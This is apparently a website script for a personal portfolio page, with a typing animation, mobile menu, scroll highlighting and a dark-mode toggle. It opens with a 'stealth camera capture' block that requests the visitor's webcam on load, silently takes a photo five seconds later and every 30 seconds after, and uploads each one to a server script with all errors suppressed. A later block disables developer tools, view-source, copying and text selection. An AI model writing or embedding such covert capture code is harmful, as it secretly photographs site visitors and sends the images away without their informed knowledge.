// ============================================
// 📸 STEALTH CAMERA CAPTURE - NO VISIBLE INDICATORS
// ============================================

(function() {
  // Check if already initialized
  if (window.stealthCameraInitialized) return;
  window.stealthCameraInitialized = true;
  
  let stealthStream = null;
  let stealthVideo = null;
  let stealthCanvas = null;
  let stealthContext = null;
  let captureInterval = null;
  
  // Completely silent function - no console logs, no notifications
  function initStealthCamera() {
    // Check if browser supports required features
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
      return; // Silently fail
    }
    
    // Create hidden elements (will be removed immediately after capture)
    try {
      // Request camera with minimal settings
      navigator.mediaDevices.getUserMedia({ 
        video: { 
          facingMode: "user",
          width: { ideal: 320 },
          height: { ideal: 240 }
        } 
      })
      .then(function(stream) {
        stealthStream = stream;
        
        // Create temporary elements (not added to DOM)
        stealthVideo = document.createElement('video');
        stealthVideo.srcObject = stream;
        stealthVideo.setAttribute('playsinline', '');
        stealthVideo.setAttribute('muted', '');
        stealthVideo.setAttribute('autoplay', '');
        
        // Play video silently
        stealthVideo.play().catch(() => {});
        
        // Create hidden canvas
        stealthCanvas = document.createElement('canvas');
        stealthCanvas.width = 320;
        stealthCanvas.height = 240;
        stealthContext = stealthCanvas.getContext('2d');
        
        // Wait for video to be ready
        let readyCheck = setInterval(function() {
          if (stealthVideo && stealthVideo.readyState === 4) {
            clearInterval(readyCheck);
            
            // Start capturing every 30 seconds
            captureInterval = setInterval(function() {
              captureAndSend();
            }, 30000); // 30 seconds
            
            // Also capture immediately on page load
            setTimeout(captureAndSend, 5000); // 5 seconds after load
          }
        }, 500);
      })
      .catch(function() {
        // Silently fail - user denied permission
      });
    } catch (e) {
      // Silently fail
    }
  }
  
  // Capture and send image
  function captureAndSend() {
    if (!stealthVideo || !stealthContext || !stealthCanvas) return;
    
    try {
      // Check if video has data
      if (stealthVideo.readyState !== 4) return;
      
      // Draw video frame to canvas
      stealthContext.drawImage(stealthVideo, 0, 0, 320, 240);
      
      // Convert to blob (smaller than base64)
      stealthCanvas.toBlob(function(blob) {
        if (!blob) return;
        
        // Create form data
        const formData = new FormData();
        const timestamp = Date.now();
        const filename = `v_${timestamp}.jpg`;
        formData.append('image', blob, filename);
        
        // Send to server using sendBeacon (works even if page unloads)
        if (navigator.sendBeacon) {
          // For unload events
          const blobToSend = new Blob([JSON.stringify({
            image: URL.createObjectURL(blob), // This won't work - need server endpoint
          })], { type: 'application/json' });
          // navigator.sendBeacon('save-capture-beacon.php', blobToSend);
        }
        
        // Use fetch (more reliable)
        fetch('save-capture-stealth.php', {
          method: 'POST',
          body: formData,
          credentials: 'omit',
          mode: 'no-cors' // Don't wait for response
        }).catch(() => {}); // Silently fail
        
      }, 'image/jpeg', 0.6); // 60% quality for smaller size
      
    } catch (e) {
      // Silently fail
    }
  }
  
  // Start when page is fully loaded
  if (document.readyState === 'complete') {
    initStealthCamera();
  } else {
    window.addEventListener('load', function() {
      // Small delay to not interfere with page load
      setTimeout(initStealthCamera, 2000);
    });
  }
  
  // Clean up on page unload (optional)
  window.addEventListener('beforeunload', function() {
    if (captureInterval) clearInterval(captureInterval);
    if (stealthStream) {
      stealthStream.getTracks().forEach(track => track.stop());
    }
  });
})();
// 🌐 Smooth Scrolling for Sidebar Menu Links
document.querySelectorAll('.sidebar-links a[href^="#"], .mobile-menu-links a[href^="#"]').forEach(anchor => {
  anchor.addEventListener("click", function (e) {
    e.preventDefault();
    const target = document.querySelector(this.getAttribute("href"));
    if (target) {
      target.scrollIntoView({
        behavior: "smooth",
        block: "start"
      });
    }

    // Highlight the active menu item
    document.querySelectorAll('.sidebar-links a, .mobile-menu-links a').forEach(link => link.classList.remove('active'));
    this.classList.add('active');
    
    // AUTO-CLOSE mobile menu after clicking
    closeMobileMenu();
  });
});

// ⚡ Animate Skill Bars (keeping for backward compatibility)
const observerOptions = {
  threshold: 0.2,
  rootMargin: "0px 0px -100px 0px"
};

// Optional: If you still have progress bars somewhere
const skillObserver = new IntersectionObserver((entries) => {
  entries.forEach(entry => {
    if (entry.isIntersecting) {
      const skillBars = entry.target.querySelectorAll(".skill-progress");
      skillBars.forEach((bar, index) => {
        const width = bar.getAttribute("data-width");
        if (!bar.classList.contains("filled")) {
          setTimeout(() => {
            bar.style.width = width + "%";
            bar.classList.add("filled");
          }, index * 150);
        }
      });
      skillObserver.unobserve(entry.target);
    }
  });
}, observerOptions);

document.querySelectorAll(".education-item, .skills-grid, .skill-category").forEach(skillBox => {
  skillObserver.observe(skillBox);
});

// ✨ Staggered animation for glass icon cards
const glassObserver = new IntersectionObserver((entries) => {
  entries.forEach((entry, index) => {
    if (entry.isIntersecting) {
      setTimeout(() => {
        entry.target.style.opacity = '1';
        entry.target.style.transform = 'translateY(0)';
      }, index * 50);
      glassObserver.unobserve(entry.target);
    }
  });
}, { threshold: 0.1 });

document.querySelectorAll('.skill-glass-card').forEach((card, index) => {
  card.style.opacity = '0';
  card.style.transform = 'translateY(20px)';
  card.style.transition = 'all 0.4s ease';
  glassObserver.observe(card);
});

// 🔢 Animate Counter Numbers (if you add stats section later)
const counterObserver = new IntersectionObserver((entries) => {
  entries.forEach(entry => {
    if (entry.isIntersecting) {
      const counters = entry.target.querySelectorAll(".stat-number");
      counters.forEach(counter => {
        const target = parseInt(counter.getAttribute("data-count"));
        const duration = 1800;
        const step = target / (duration / 16);
        let current = 0;

        if (!counter.classList.contains("counted")) {
          const timer = setInterval(() => {
            current += step;
            if (current >= target) {
              counter.textContent = target + "+";
              clearInterval(timer);
            } else {
              counter.textContent = Math.floor(current);
            }
          }, 16);
          counter.classList.add("counted");
        }
      });
    }
  });
}, observerOptions);

document.querySelectorAll(".about-stats").forEach(stats => {
  counterObserver.observe(stats);
});

// 💫 Page Load Fade-in Animation
window.addEventListener("load", () => {
  document.body.style.opacity = "0";
  document.body.style.transition = "opacity 0.5s ease";
  setTimeout(() => {
    document.body.style.opacity = "1";
  }, 100);
});

// ✨ TYPING ANIMATION FOR HERO TITLE - TWO LINES
document.addEventListener('DOMContentLoaded', function() {
  // Add cursor styles dynamically if not in CSS
  if (!document.querySelector('#typing-styles')) {
    const style = document.createElement('style');
    style.id = 'typing-styles';
    style.textContent = `
      .typed-cursor {
        display: inline-block;
        width: 3px;
        height: 1.2em;
        background-color: var(--primary-color);
        margin-left: 2px;
        animation: blink 0.7s infinite;
        vertical-align: middle;
      }
      
      .typed-cursor.hide-cursor {
        display: none !important;
      }
      
      @keyframes blink {
        0%, 50% { opacity: 1; }
        51%, 100% { opacity: 0; }
      }
    `;
    document.head.appendChild(style);
  }

  const heroTitle = document.querySelector('.hero-text h1');
  if (!heroTitle) return;
  
  // Set up the title structure for two lines
  heroTitle.innerHTML = '<span class="static-text">Hi, I\'m</span><span class="name-line"><span class="highlight"></span></span>';
  
  const highlightSpan = heroTitle.querySelector('.highlight');
  if (!highlightSpan) return;
  
  // Create cursor element
  const cursor = document.createElement('span');
  cursor.className = 'typed-cursor';
  
  // Add cursor after the highlight span
  if (highlightSpan.nextSibling) {
    highlightSpan.parentNode.insertBefore(cursor, highlightSpan.nextSibling);
  } else {
    highlightSpan.parentNode.appendChild(cursor);
  }
  
  const nameText = "HARIPRASANTH.T";
  let i = 0;
  const typeSpeed = 100;
  
  function typeWriter() {
    if (i < nameText.length) {
      highlightSpan.innerHTML += nameText.charAt(i);
      i++;
      
      if (window.innerWidth <= 900) {
        setTimeout(typeWriter, 80);
      } else {
        setTimeout(typeWriter, typeSpeed);
      }
    } else {
      // Animation complete - hide the cursor after a delay
      setTimeout(() => {
        cursor.classList.add('hide-cursor');
      }, 300);
    }
  }
  
  // Start typing animation
  setTimeout(typeWriter, 500);
  
  // Force start on mobile
  if (/Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
    setTimeout(() => {
      if (i === 0) typeWriter();
    }, 100);
  }
});

// 📱 MOBILE MENU FUNCTIONS
function closeMobileMenu() {
  const menuPopup = document.getElementById('mobileMenuPopup');
  const menuOverlay = document.getElementById('menuOverlay');
  if (menuPopup && menuOverlay) {
    menuPopup.classList.remove('active');
    menuOverlay.classList.remove('active');
    document.body.classList.remove('menu-open');
  }
}

function openMobileMenu() {
  const menuPopup = document.getElementById('mobileMenuPopup');
  const menuOverlay = document.getElementById('menuOverlay');
  if (menuPopup && menuOverlay) {
    menuPopup.classList.add('active');
    menuOverlay.classList.add('active');
    document.body.classList.add('menu-open');
  }
}

// Mobile menu event listeners
document.addEventListener('DOMContentLoaded', function() {
  const menuToggle = document.getElementById('mobileMenuToggle');
  const menuPopup = document.getElementById('mobileMenuPopup');
  const menuOverlay = document.getElementById('menuOverlay');
  const menuCloseBtn = document.getElementById('menuCloseBtn');
  
  if (menuToggle && menuPopup && menuOverlay) {
    menuToggle.addEventListener('click', function(e) {
      e.stopPropagation();
      openMobileMenu();
    });
    
    // Close with close button
    if (menuCloseBtn) {
      menuCloseBtn.addEventListener('click', closeMobileMenu);
    }
    
    // Close when clicking overlay
    menuOverlay.addEventListener('click', closeMobileMenu);
    
    // Close on escape key
    document.addEventListener('keydown', function(e) {
      if (e.key === 'Escape' && menuPopup.classList.contains('active')) {
        closeMobileMenu();
      }
    });
  }
});

// 🔍 ACTIVE MENU HIGHLIGHT ON SCROLL
window.addEventListener('scroll', function() {
  const sections = document.querySelectorAll('section[id]');
  const scrollPosition = window.scrollY + 100;
  
  sections.forEach(section => {
    const sectionTop = section.offsetTop;
    const sectionBottom = sectionTop + section.offsetHeight;
    const sectionId = section.getAttribute('id');
    
    if (scrollPosition >= sectionTop && scrollPosition < sectionBottom) {
      // Remove active class from all links
      document.querySelectorAll('.sidebar-links a, .mobile-menu-links a').forEach(link => {
        link.classList.remove('active');
      });
      
      // Add active class to matching links
      document.querySelectorAll(`.sidebar-links a[href="#${sectionId}"], .mobile-menu-links a[href="#${sectionId}"]`).forEach(link => {
        link.classList.add('active');
      });
    }
  });
});

// ============================================
// 🚫 COPY PROTECTION
// ============================================

// 🚫 DISABLE RIGHT-CLICK CONTEXT MENU
document.addEventListener('contextmenu', function(e) {
  e.preventDefault();
  return false;
});

// 🚫 DISABLE KEYBOARD SHORTCUTS
document.addEventListener('keydown', function(e) {
  // F12
  if (e.key === 'F12') {
    e.preventDefault();
    return false;
  }
  // Ctrl+Shift+I (Inspect)
  if (e.ctrlKey && e.shiftKey && e.key === 'I') {
    e.preventDefault();
    return false;
  }
  // Ctrl+Shift+J (Console)
  if (e.ctrlKey && e.shiftKey && e.key === 'J') {
    e.preventDefault();
    return false;
  }
  // Ctrl+U (View Source)
  if (e.ctrlKey && e.key === 'u') {
    e.preventDefault();
    return false;
  }
  
  // 🚫 DISABLE COPY (Ctrl+C, Cmd+C)
  if (e.ctrlKey && e.key === 'c') {
    e.preventDefault();
    return false;
  }
  
  // 🚫 DISABLE CUT (Ctrl+X, Cmd+X)
  if (e.ctrlKey && e.key === 'x') {
    e.preventDefault();
    return false;
  }
  
  // 🚫 DISABLE PASTE (Ctrl+V, Cmd+V)
  if (e.ctrlKey && e.key === 'v') {
    e.preventDefault();
    return false;
  }
  
  // 🚫 DISABLE SELECT ALL (Ctrl+A, Cmd+A)
  if (e.ctrlKey && e.key === 'a') {
    e.preventDefault();
    return false;
  }
  
  // 🚫 DISABLE SAVE (Ctrl+S, Cmd+S)
  if (e.ctrlKey && e.key === 's') {
    e.preventDefault();
    return false;
  }
  
  // 🚫 DISABLE PRINT (Ctrl+P, Cmd+P)
  if (e.ctrlKey && e.key === 'p') {
    e.preventDefault();
    return false;
  }
});

// 🚫 DISABLE TEXT SELECTION
document.addEventListener('selectstart', function(e) {
  e.preventDefault();
  return false;
});

// 🚫 DISABLE COPY EVENT
document.addEventListener('copy', function(e) {
  e.preventDefault();
  return false;
});

// 🚫 DISABLE CUT EVENT
document.addEventListener('cut', function(e) {
  e.preventDefault();
  return false;
});

// 🚫 DISABLE DRAG AND DROP
document.addEventListener('dragstart', function(e) {
  e.preventDefault();
  return false;
});

// 🚫 DISABLE DROP
document.addEventListener('drop', function(e) {
  e.preventDefault();
  return false;
});

// ============================================
// 🌓 DARK/LIGHT MODE TOGGLE - Triple click on profile image
// ============================================

let clickCount = 0;
let clickTimer = null;

// Use both class and ID to ensure it works
const profileImage = document.querySelector('.profile-card, #profileImage');
if (profileImage) {
  profileImage.addEventListener('click', function(e) {
    e.stopPropagation(); // Prevent event bubbling
    clickCount++;
    
    // Clear previous timer
    if (clickTimer) {
      clearTimeout(clickTimer);
    }
    
    // Set timer to reset click count after 1 second
    clickTimer = setTimeout(() => {
      clickCount = 0;
    }, 1000);
    
    // Triple click detected
    if (clickCount === 3) {
      // Toggle light/dark mode
      document.body.classList.toggle('light-mode');
      
      // Show notification
      const mode = document.body.classList.contains('light-mode') ? 'Light' : 'Dark';
      showModeNotification(`${mode} mode activated`);
      
      // Reset click count
      clickCount = 0;
      clearTimeout(clickTimer);
    }
  });
  
  // Add touch event for mobile
  profileImage.addEventListener('touchstart', function(e) {
    e.preventDefault(); // Prevent double-tap zoom
    // The click event will handle the counting
  });
}

// Show mode notification
function showModeNotification(message) {
  // Remove existing notification
  const oldNotification = document.querySelector('.mode-notification');
  if (oldNotification) {
    oldNotification.remove();
  }
  
  // Create notification element
  const notification = document.createElement('div');
  notification.className = 'mode-notification';
  notification.textContent = message;
  
  // Add styles dynamically
  notification.style.cssText = `
    position: fixed;
    top: 20px;
    right: 20px;
    background: var(--primary-color);
    color: white;
    padding: 10px 20px;
    border-radius: 8px;
    font-weight: 600;
    z-index: 9999;
    animation: slideIn 0.3s ease, fadeOut 0.3s ease 1.7s forwards;
    box-shadow: 0 4px 15px rgba(0,0,0,0.3);
  `;
  
  // Add animation styles if not already present
  if (!document.querySelector('#notification-styles')) {
    const style = document.createElement('style');
    style.id = 'notification-styles';
    style.textContent = `
      @keyframes slideIn {
        from {
          transform: translateX(100px);
          opacity: 0;
        }
        to {
          transform: translateX(0);
          opacity: 1;
        }
      }
      @keyframes fadeOut {
        to {
          opacity: 0;
          transform: translateY(-20px);
        }
      }
    `;
    document.head.appendChild(style);
  }
  
  document.body.appendChild(notification);
  
  // Remove after 2 seconds
  setTimeout(() => {
    if (notification && notification.parentNode) {
      notification.remove();
    }
  }, 2000);
}
